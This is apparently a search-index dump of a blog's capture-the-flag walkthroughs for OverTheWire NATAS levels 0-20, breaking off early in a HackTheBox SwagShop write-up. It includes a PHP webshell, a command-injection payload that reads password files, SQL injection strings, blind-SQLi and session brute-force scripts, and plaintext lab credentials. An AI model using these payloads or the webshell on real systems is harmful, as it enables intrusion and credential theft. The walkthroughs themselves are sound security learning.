&#39;http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/&#39;# Check if we can connect to the targetr = requests.get(target)if r.status_code != requests.codes.ok: raise ValueError(&#39;Couldn\\&#39;t connect to target :(&#39;)else: print(&#39;Target reachable. Starting character parsing...&#39;)# Send request with incrementing session id in a loop until we get adminsession = 0while(True): session += 1 print(&quot;Attempting Session ID: &quot; + str(session)) headers = {&#39;Cookie&#39;: &#39;PHPSESSID=&#39; + str(session)} r = requests.get(target, headers=headers) if gstr in r.text: print(&quot;Password Found!&quot;) print(r.text) break LEVEL 19This level doesn’t supply a link to it’s sourcecode, so we have to logically deduce what is going on behind the scenes. Much of the functionality should be the same as the previous level, but the text suggests there is a change to the session id.After attempting the login, then you can see what the session id is. Try a few logins to compare different session id’s. These are the ones I got:1) 3539392d61646d696e2) 3633312d61646d696e3) 3337392d61646d696eOnly the first half of the ID changes. Also, just from experience with binary data, it looks to me like hex encoded ascii. When decoded, they come out to:1) 599-admin2) 631-admin3) 379-adminThe pattern is pretty clear, this level just adds “-admin” onto the incremental ID. Simply add that to the attack code from before to get the password to the next level.#!/usr/bin/python3# Script to brute force level 19 of natas challenges# Library to work with the POST requestsimport requests# Good message to search forgstr = &quot;Password&quot;bstr = &quot;logged in as a regular user&quot;# Our target URLtarget = &#39;http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/&#39;# Checking if we can connect to the target, just in case...r = requests.get(target)if r.status_code != requests.codes.ok: raise ValueError(&#39;Couldn\\&#39;t connect to target :(&#39;)else: print(&#39;Target reachable. Starting character parsing...&#39;)# Send request with incrementing session id in a loop until we get adminnum = 0while(num &amp;lt; 640): num += 1 session = str(num) + &quot;-admin&quot; session = session.encode(&#39;utf-8&#39;) print(&quot;Attempting Session ID: &quot; + session.hex()) headers = {&#39;Cookie&#39;: &#39;PHPSESSID=&#39; + session.hex()} r = requests.get(target, headers=headers) if bstr not in r.text: print(r.text) break LEVEL 20sourcecode:&amp;lt;?function debug($msg) { if(array_key_exists(&quot;debug&quot;, $_GET)) { print &quot;DEBUG: $msg&amp;lt;br&amp;gt;&quot;; }}function print_credentials() { if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) { print &quot;You are an admin. The credentials for the next level are:&amp;lt;br&amp;gt;&quot;; print &quot;&amp;lt;pre&amp;gt;Username: natas21\\n&quot;; print &quot;Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&quot;; } else { print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&quot;; }}/* we don&#39;t need this */function myopen($path, $name) { //debug(&quot;MYOPEN $path $name&quot;); return true; }/* we don&#39;t need this */function myclose() { //debug(&quot;MYCLOSE&quot;); return true; }function myread($sid) { debug(&quot;MYREAD $sid&quot;); if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) { debug(&quot;Invalid SID&quot;); return &quot;&quot;; } $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid; if(!file_exists($filename)) { debug(&quot;Session file doesn&#39;t exist&quot;); return &quot;&quot;; } debug(&quot;Reading from &quot;. $filename); $data = file_get_contents($filename); $_SESSION = array(); foreach(explode(&quot;\\n&quot;, $data) as $line) { debug(&quot;Read [$line]&quot;); $parts = explode(&quot; &quot;, $line, 2); if($parts[0] != &quot;&quot;) $_SESSION[$parts[0]] = $parts[1]; } return session_encode();}function mywrite($sid, $data) { // $data contains the serialized version of $_SESSION // but our encoding is better debug(&quot;MYWRITE $sid $data&quot;); // make sure the sid is alnum only!! if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) { debug(&quot;Invalid SID&quot;); return; } $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid; $data = &quot;&quot;; debug(&quot;Saving in &quot;. $filename); ksort($_SESSION); foreach($_SESSION as $key =&amp;gt; $value) { debug(&quot;$key =&amp;gt; $value&quot;); $data .= &quot;$key $value\\n&quot;; } file_put_contents($filename, $data); chmod($filename, 0600);}/* we don&#39;t need this */function mydestroy($sid) { //debug(&quot;MYDESTROY $sid&quot;); return true; }/* we don&#39;t need this */function mygarbage($t) { //debug(&quot;MYGARBAGE $t&quot;); return true; }session_set_save_handler( &quot;myopen&quot;, &quot;myclose&quot;, &quot;myread&quot;, &quot;mywrite&quot;, &quot;mydestroy&quot;, &quot;mygarbage&quot;);session_start();if(array_key_exists(&quot;name&quot;, $_REQUEST)) { $_SESSION[&quot;name&quot;] = $_REQUEST[&quot;name&quot;]; debug(&quot;Name set to &quot; . $_REQUEST[&quot;name&quot;]);}print_credentials();$name = &quot;&quot;;if(array_key_exists(&quot;name&quot;, $_SESSION)) { $name = $_SESSION[&quot;name&quot;];}?&amp;gt;Figuring out this code and what it is doing took me a little while. What is positively super helpful is setting the “debug” flag. To do so, just add”?debug=1″ on the URL. That will help provide a lot of insight.You’ll see that whatever you put into the form after “name”, the debug returns it as part of your name, and that works even if it’s on a new line! According to the source we have, when the code reads back data from the session file it does so line by line. So new lines mean new variables to the server side code, and the variable we’re interested in is “admin”. Therefore “admin” needs to be set after the name variable. One caveat though, variables set in forms are in the format “variable=value”, and that doesn’t work for the server side “admin” variable. That one actually needs to be in the format “variable value”.So the way to get admin is, using Burp, add “admin 1” on a new line by itself after the “name” variable. Then you’ll have to load the page twice. Once for the code to write it into the session file on the server. And the second to read it back as an admin status." }, { "title": "OverTheWire: NATAS 11 &amp;#8211; 15", "url": "/posts/overthewire-natas-11/", "categories": "Walkthrough, OverTheWire", "tags": "web", "date": "2019-09-12 12:03:00 -0400", "snippet": "LEVEL 11PHP sourcecode:&amp;lt;?$defaultdata = array( &quot;showpassword&quot;=&amp;gt;&quot;no&quot;, &quot;bgcolor&quot;=&amp;gt;&quot;#ffffff&quot;);function xor_encrypt($in) { $key = &#39;&amp;lt;censored&amp;gt;&#39;; $text = $in; $outText = &#39;&#39;; // Iterate through each character for($i=0;$i&amp;lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText;}function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(&quot;data&quot;, $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true); if(is_array($tempdata) &amp;amp;&amp;amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;amp;&amp;amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) { if (preg_match(&#39;/^#(?:[a-f\\d]{6})$/i&#39;, $tempdata[&#39;bgcolor&#39;])) { $mydata[&#39;showpassword&#39;] = $tempdata[&#39;showpassword&#39;]; $mydata[&#39;bgcolor&#39;] = $tempdata[&#39;bgcolor&#39;]; } } } return $mydata;}function saveData($d) { setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));}$data = loadData($defaultdata);if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) { if (preg_match(&#39;/^#(?:[a-f\\d]{6})$/i&#39;, $_REQUEST[&#39;bgcolor&#39;])) { $data[&#39;bgcolor&#39;] = $_REQUEST[&#39;bgcolor&#39;]; }}saveData($data);?&amp;gt;&amp;lt;h1&amp;gt;natas11&amp;lt;/h1&amp;gt;&amp;lt;div id=&quot;content&quot;&amp;gt;&amp;lt;body style=&quot;background: &amp;lt;?=$data[&#39;bgcolor&#39;]?&amp;gt;;&quot;&amp;gt;Cookies are protected with XOR encryption&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;?if($data[&quot;showpassword&quot;] == &quot;yes&quot;) { print &quot;The password for natas12 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&quot;;}?&amp;gt;&amp;lt;form&amp;gt;Background color: &amp;lt;input name=bgcolor value=&quot;&amp;lt;?=$data[&#39;bgcolor&#39;]?&amp;gt;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;Set color&quot;&amp;gt;&amp;lt;/form&amp;gt;Attempt 1.Since there’s an input box here that can set the “bgcolor” variable, we probably have to use that somehow to inject the values we want.Maybe we can break the JSON with a quotation character and inject another “showpassword” value. Typing it into the form field should look like “,”showpassword”:”yes” .However, that didn’t work, thanks to the character filter preg_match(‘/^#(?:[a-f\\d]{6})$/i’, $_REQUEST[‘bgcolor’]) . Back to the drawing board…Attempt 2The bottom part of the sourcecode suggests that if we get the $data (which is a JSON array saved in a cookie) variable “showpassword” to be “yes”, then we will get the next password. And the line $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[“data”])), true); shows that our cookie is json encoded, then xor_encrypted, then base64 encoded.To inject the “showpassword” value, we will need to recreate all these things and save it in the “data” cookie.The JSON format for the values needed is:{“showpassword”:”yes”,”bgcolor”:”#ffffff”}For the XOR encryption, I did a quick Google search and found a python script I can use for this. I modified it a little to work with arguments passed to it instead of hardcoded values.When putting it all together with the current level’s password as the XOR key, it did NOTHING when I set that as the cookie. So that’s not the key, we need to figure out what it is.XOR isn’t a particularly good method of encryption, and very vulnerable to a known plaintext attack. We can probably get the key out since we know what data should decrypt to: {“showpassword”:”no”,”bgcolor”:”#ffffff”}The cookie data value is “ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=” , so we would just XOR that with the JSON code above and hopefully get a good result.The code I used for the decryption is (based on this script):#!/usr/bin/python# NB : this is not secure# from http://code.activestate.com/recipes/266586-simple-xor-keyword-encryption/# added base64 encoding for simple querystring :)#import sysimport base64from itertools import izip, cycledef xor_crypt_string(data, key=&#39;awesomepassword&#39;, encode=True, decode=True): if decode: data = base64.decodestring(data) xored = &#39;&#39;.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key))) if encode: return base64.encodestring(xored).strip() return xoredif __name__ == &#39;__main__&#39;: result = xor_crypt_string(&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#39;, &#39;{&quot;showpassword&quot;:&quot;no&quot;,&quot;bgcolor&quot;:&quot;#ffffff&quot;}&#39;, False, True) print(result)The output is “qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq” which is clearly a good result! That means the key is “qw8J”! Now that we have the key, it can be used to make a new cookie with the values we want.String to encrypt should be: {“showpassword”:”yes”,”bgcolor”:”#ffffff”}, with the key “qw8J”. Change the script above to use these values and presto!“ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK” is the output, just put that in the cookie with Burp and you’ll have the password! LEVEL 12Sourcecode PHP:&amp;lt;?function genRandomString() { $length = 10; $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; $string = &quot;&quot;; for ($p = 0; $p &amp;lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string;}function makeRandomPath($dir, $ext) { do { $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext; } while(file_exists($path)); return $path;}function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext);}if(array_key_exists(&quot;filename&quot;, $_POST)) { $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]); if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &amp;gt; 1000) { echo &quot;File is too big&quot;; } else { if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) { echo &quot;The file &amp;lt;a href=\\&quot;$target_path\\&quot;&amp;gt;$target_path&amp;lt;/a&amp;gt; has been uploaded&quot;; } else{ echo &quot;There was an error uploading the file, please try again!&quot;; } }} else {?&amp;gt;&amp;lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&quot; /&amp;gt;Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt;&amp;lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;? } ?&amp;gt;Attempt 1This level has a file upload, so there’s a couple of probable ways this could be vulnerable. It could be possible to upload a PHP webshell depending on what it does with the file after it’s uploaded. Or it could be vulnerable to directory traversal in the filename. On looking into the sourcecode, it kind of looks like it will be a vulnerability with the filename. It looks like part of the filename will be randomized, but the extension will be preserved.I made a very small JPEG file since the max is only 1KB, and first tested it on the site to make sure it would go through.So it does randomize the name but preserve the extension. If I put in “/../” into the extension, maybe I can go up a directory. My system gave me a warning that files can’t be named with “/” in it, so maybe I can use URL encoding to get around that. I am able to save a filename that way, but the page doesn’t care, it replaces my filename completely and appends a “.jpg” as the extension with &amp;lt;input type=”hidden” name=”filename” value=”.jpg” /&amp;gt;.Attempt 2Instead of directly using the filename, we can use Burp to send it whatever we want in the form. Some experimentation shows that it does preserve the extension when put into the form with Burp.I confirmed the vulnerability does allow me to load a PHP file. Since a link to the file is returned, it’s almost certain to allow me to use a webshell.Here is the webshell I used:&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&amp;lt;?phpif(isset($_REQUEST[&#39;cmd&#39;])){ echo &quot;&amp;lt;pre&amp;gt;&quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &quot;&amp;lt;/pre&amp;gt;&quot;; die;}?&amp;gt;Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd&amp;lt;!-- http://michaeldaw.org 2006 --&amp;gt;And this command gave the password: http://natas12.natas.labs.overthewire.org/upload/2hqri8g7u3.php?cmd=cat+/etc/natas_webpass/natas13 LEVEL 13Uploading the same PHP file as last time gives an error:So there’s a check on the file contents itself. We can probably add just the “magic bytes” at the beginning of the file to make it look like a JPEG. Or hide PHP code within the EXIF data of a legitimate JPEG file.Using some tools on my Kali box, I wrote the PHP webshell into the comment section of a JPEG file:wrjpgcom -cfile phpupload upload.jpg &amp;gt; test.jpgAfter I uploaded it with the form, I used Burp to modify the form submission to change the extension (like the last level) to php. The results: LEVEL 14This level is a common user authentication form. Let’s see the sourcecode.&amp;lt;?if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect(&#39;localhost&#39;, &#39;natas14&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); mysql_select_db(&#39;natas14&#39;, $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot; and password=\\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&amp;lt;br&amp;gt;&quot;; } if(mysql_num_rows(mysql_query($query, $link)) &amp;gt; 0) { echo &quot;Successful login! The password for natas15 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&quot;; } else { echo &quot;Access denied!&amp;lt;br&amp;gt;&quot;; } mysql_close($link);} else {?&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;Username: &amp;lt;input name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;Password: &amp;lt;input name=&quot;password&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;? } ?&amp;gt;There is a simple SQL Injection vulnerability since the input has no filters or checks on it. Sending a double quote character will break the SQL and prove the vulnerability:A simple SQLi statement should get us in, we don’t even need to put anything in the password field if we comment out the rest of the query. The most basic statement is “or 1=1 —- but it only works if there’s a trailing space. I suppose that’s so the query sees the comment mark ‘–‘ instead of ‘–\\”‘. Alternatively, you could probably use the other comment character “#”. LEVEL 15And the sourcecode:&amp;lt;?/*CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL);*/if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); mysql_select_db(&#39;natas15&#39;, $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&amp;lt;br&amp;gt;&quot;; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &amp;gt; 0) { echo &quot;This user exists.&amp;lt;br&amp;gt;&quot;; } else { echo &quot;This user doesn&#39;t exist.&amp;lt;br&amp;gt;&quot;; } } else { echo &quot;Error in query.&amp;lt;br&amp;gt;&quot;; } mysql_close($link);} else {?&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;Username: &amp;lt;input name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;? } ?&amp;gt;It looks like another SQL Injection just like the previous level. Let’s try a basic SQLi statement like before:&quot;or 1=1 -- So it’s proven to be vulnerable, now we need to exploit it to get the password out. I checked that natas16 is a user, so we need to pull the password out of that record specifically.The script only shows a few different possible outputs, depending on the state of the result, suppressing any error messages. So this is a Blind SQL Injection and requires more patience to exploit.Best way that I know of is to validate each character of the password with the output states “This user exists” or “This user doesn’t exist”. Since doing this by hand will take forever and a day, a python script is how I chose to do it. Here is my code to get the password:#!/usr/bin/python3## main execution script for solving natas15 on OverTheWire.orgimport requests# All possible charactersallChars = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;# Characters usedusedChars = &#39;&#39;# Final Passwordpassword = &#39;&#39;# Our target URLtarget = &quot;http://natas15.natas.labs.overthewire.org&quot;headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101&#39;, &#39;Authorization&#39;: &#39;Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==&#39;,}def send_query(query): payload = {&#39;username&#39;: query} print(&quot;Payload: &quot; + str(payload)) response = requests.post(target + &#39;/index.php?&#39;, data=payload, headers=headers) return responser = requests.get(target, headers=headers)if r.status_code != requests.codes.ok: raise ValueError(&#39;Couldn\\&#39;t connect to target :(&#39;)else: print(&#39;Target reachable. Starting character parsing...&#39;)# Get list of characters used so we don&#39;t have to iterate unnecessarilyprint(&quot;Getting list of characters used...&quot;)for c in allChars: print(&quot;Trying Character: &quot; + c) resp = send_query(&#39;natas16&quot; and password like &quot;%s%s%s&quot; #&#39; % (&quot;%&quot;, c, &quot;%&quot;)) if &#39;exists&#39; in str(resp.content): usedChars += c print(&quot;Character found: &quot; + c)print(&quot;Characters used: &quot; + usedChars)# Retrieve the password one char at a timefor i in range(1, 33): print(&quot;Testing password...&quot;) for c in usedChars: print(&quot;Trying Character: &quot; + c) print(&quot;Password so far: &quot; + password) resp = send_query(&#39;natas16&quot; and ascii(substring((select password from users where username=&quot;natas16&quot;),%d,1))=%s #&#39; % (i, ord(c))) if &#39;exists&#39; in str(resp.content): password += c breakprint(&#39;Password: &#39; + password)" }, { "title": "OverTheWire: NATAS 0 &amp;#8211; 10", "url": "/posts/overthewire-natas/", "categories": "Walkthrough, OverTheWire", "tags": "web", "date": "2019-09-10 15:55:39 -0400", "snippet": "LEVEL 0The password for the next level is embedded in the HTML source code as a comment.&amp;lt;!–The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto –&amp;gt; LEVEL 1 You can find the password for the next level on this page, but rightclicking has been blocked!Press “ALT” button to get to the menu if it isn’t visible, then go to “Tools -&amp;gt; Web Developer Menu” and view the Page Source.&amp;lt;!–The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi –&amp;gt; LEVEL 2 There is nothing on this pageLooking into the page source, you can see an image “files/pixel.png”.If you browse to the “files” directory, it is open for viewing and there’s another file called “users.txt” where you’ll find the next password.# username:passwordalice:BYNdCesZqWbob:jw2ueICLvTcharlie:G5vCxkVV3mnatas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14eve:zo4mJWyNj2mallory:9urtcpzBmH LEVEL 3 There is nothing on this pageLooking in the page source, you’ll see &amp;lt;!– No more information leaks!! Not even Google will find it this time… –&amp;gt; . That makes me think they’re trying to block Google’s web crawler’s from picking up something. It’s a well known flaw to have secret things listed in the “robots.txt” file that web crawlers look for, so take a look there.Voila!User-agent: *Disallow: /s3cr3t/In the “s3cr3t” directory, there’s a “users.txt” file with the next credentials.natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ LEVEL 4 Access disallowed. You are visiting from “” while authorized users should come only from “http://natas5.natas.labs.overthewire.org/”This makes me think it’s checking the referrer to see what page we’re coming from.To edit HTTP headers and other changes, I like to use Burp Suite, which is purpose built for testing websites.Using Burp, view the headers on the request and see what the referrer is. Mine didn’t have a referrer, so that explains the blank quotes on the page.I added a referrer like so:GET / HTTP/1.1Host: natas4.natas.labs.overthewire.orgUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateCookie: __cfduid=d36afe6edde0ea62a428daa5ba6f1cc781568143940Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0VaConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Referer: http://natas4.natas.labs.overthewire.organd it showed up on the page as: Access disallowed. You are visiting from “http://natas4.natas.labs.overthewire.org” while authorized users should come only from “http://natas5.natas.labs.overthewire.org/”So I changed the referrer address to http://natas5.natas.labs.overthewire.org/ and it worked! Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq LEVEL 5 Access disallowed. You are not logged inThe page source on this one shows nothing. However, the response HTTP headers do show something interesting:HTTP/1.1 200 OKDate: Tue, 10 Sep 2019 20:18:26 GMTServer: Apache/2.4.10 (Debian)Set-Cookie: loggedin=0Vary: Accept-EncodingContent-Length: 855Connection: closeContent-Type: text/html; charset=UTF-8It sets a cookie “loggedin” to “0”. If we change that cookie value to “1” it will probably trick the site into thinking we are logged in and can access the content.I used the Web Developer Tools in the browser to change the cookie and then refreshed the page to get the next password. Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 LEVEL 6When viewing the sourcecode using the link provided, you’ll notice some PHP code:&amp;lt;?include &quot;includes/secret.inc&quot;; if(array_key_exists(&quot;submit&quot;, $_POST)) { if($secret == $_POST[&#39;secret&#39;]) { print &quot;Access granted. The password for natas7 is &amp;amp;lt;censored&amp;amp;gt;&quot;; } else { print &quot;Wrong secret&quot;; } }?&amp;gt;The PHP code is looking at an included file called “secret.inc” and checking it against what we’re entering in the input form. Browsing to the included file at “/includes/secret.inc” gives us the secret.&amp;lt;?$secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;;?&amp;gt;When you put that secret string into the Input box, it gives you the password for the next level. Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 LEVEL 7This level gives us two pages we can browse to, “Home” and “About”. They’re equally boring and probably not worth clicking on. What is worth investigating is the page source however. There you’ll see:&amp;lt;!– hint: password for webuser natas8 is in /etc/natas_webpass/natas8 –&amp;gt;That suggests to solve this level, we will need to pull a file from the server. Local File Include vulnerability maybe? In the page source, the links to “Home” and “About” show a PHP script is being called to serve them, by passing “page=” to “index.php”. Putting in the path to the webpass file into the “page” variable will probably give us the password.Sure enough, it does! LEVEL 8This is another secret sauce input box. Glad they have that sourcecode button or these might really be hard.There is PHP code in the source on this one as well:&amp;lt;?$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret)));}if(array_key_exists(&quot;submit&quot;, $_POST)) { if(encodeSecret($_POST[&#39;secret&#39;]) == $encodedSecret) { print &quot;Access granted. The password for natas9 is &amp;amp;lt;censored&amp;amp;gt;&quot;; } else { print &quot;Wrong secret&quot;; }}?&amp;gt;Notice this part:return bin2hex(strrev(base64_encode($secret)));It is taking the secret string, base64 encoding it, then reversing the letters, then hex encoding the characters. So to get the original string, we only have to do the exact opposite!To decode the Secret from hex back to ASCII, use the “XXD” command like so:echo -n &quot;3d3d516343746d4d6d6c315669563362&quot; | xxd -r -psThe “rev” command will reverse the string.And lastly, the “base64” command will decode it to it’s original form. Putting all of this together looks like this:echo -n “3d3d516343746d4d6d6c315669563362” | xxd -r -ps | rev | base64 -dTake the result and submit it in the form to get the next password! LEVEL 9The PHP code in this page is:&amp;lt;?$key = &quot;&quot;;if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;];}if($key != &quot;&quot;) { passthru(&quot;grep -i $key dictionary.txt&quot;);}?&amp;gt;So this code is taking our input variable “needle” and passing it’s value to “grep”, which looks up the value in a dictionary file, then returns the result.We can exploit an injection here, with command substitution. Using a “$()” string will execute whatever is inside the parentheses. Since the rules of the NATAS say that all passwords are stored in “/etc/natas_webpass/”, we can use the injection to read out the file we need.If we read out the file by using “cat”, like ?needle=$(cat /etc/natas_webpass/natas10) it won’t return anything since that isn’t in the dictionary file. We could make a script that looks up each character in the password with an “if” statement, showing dictionary results only when we get a match, one character at a time. Pretty sure that’s the way this level was intended to be solved…But there is a better way. What if I told you we could use the bash command substitution to forcefully inject the password into the PHP script’s output? I tried a bunch of things, and eventually found that we can inject straight into the output file descriptor for the PHP script. We have to get the Process ID of the PHP script, and bash makes it easy for us by designating a variable for the current PID, “$$”.So the command become something like cat /etc/natas_webpass/natas10 1&amp;gt; /proc/$$/fd/1 where “1&amp;gt;” is redirecting output and “/proc/\\(/fd/1&amp;amp;#8221; is the output file descriptor for the current process. To send it to the PHP script, type this into the address bar: `?needle=$(cat+/etc/natas_webpass/natas10+1&amp;gt;+/proc/\\)/fd/1)`This is the coolest solution I came up with for the whole NATAS site! LEVEL 10Oh great, a character filter! Looking into the sourcecode we can see which characters are bad:&amp;lt;?$key = &quot;&quot;;if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;];}if($key != &quot;&quot;) { if(preg_match(&#39;/[;|&amp;amp;]/&#39;,$key)) { print &quot;Input contains an illegal character!&quot;; } else { passthru(&quot;grep -i $key dictionary.txt&quot;); }}?&amp;gt;The characters “; | &amp;#38;” can’t be used now. No problem, our last solution doesn’t use any of those! Lol, just send the same request as the last level, modified to get the correct password file of course.Boom! Gotcha." }, { "title": "HackTheBox: SwagShop", "url": "/posts/hackthebox-swagshop/", "categories": "Walkthrough, HackTheBox", "tags": "Linux, Magento, vi escape", "date": "2019-08-19 12:40:27 -0400", "snippet": "ReconThis site is a basic e-commerce site with just a few products filled in as examples. Magento is the platform and it’s very well-known.Port ScanNMAP doesn’t show anything out of the ordinary for a web host:PORT STATE SERVICE REASON VERSION&amp;lt;strong&amp;gt;22/tcp open &amp;lt;/strong&amp;gt; &amp;lt;strong&amp;gt;ssh &amp;lt;/strong&amp;gt; syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)| 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)|_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)&amp;lt;strong&amp;gt;80/tcp open &amp;lt;/strong&amp;gt; &amp;lt;strong&amp;gt;http &amp;lt;/strong&amp;gt; syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Home pageWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.8 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 4.2 (95%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 0.003 days (since Tue Aug 13 09:45:05 2019)Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that Apache 2.4.18 is the web server platform.Directory ScanGoBuster was able to find quite a few directories related to Magento:=====================================================Gobuster v2.0.0 OJ Reeves (@TheColonial)=====================================================[+] Mode : dir[+] Url/Domain : http://10.10.10.140/[+] Threads : 10[+] Wordlist : /usr/share/wordlists/dirb/big.txt[+] Status codes : 200,204,301,302,307,403[+] Expanded : true[+] Timeout : 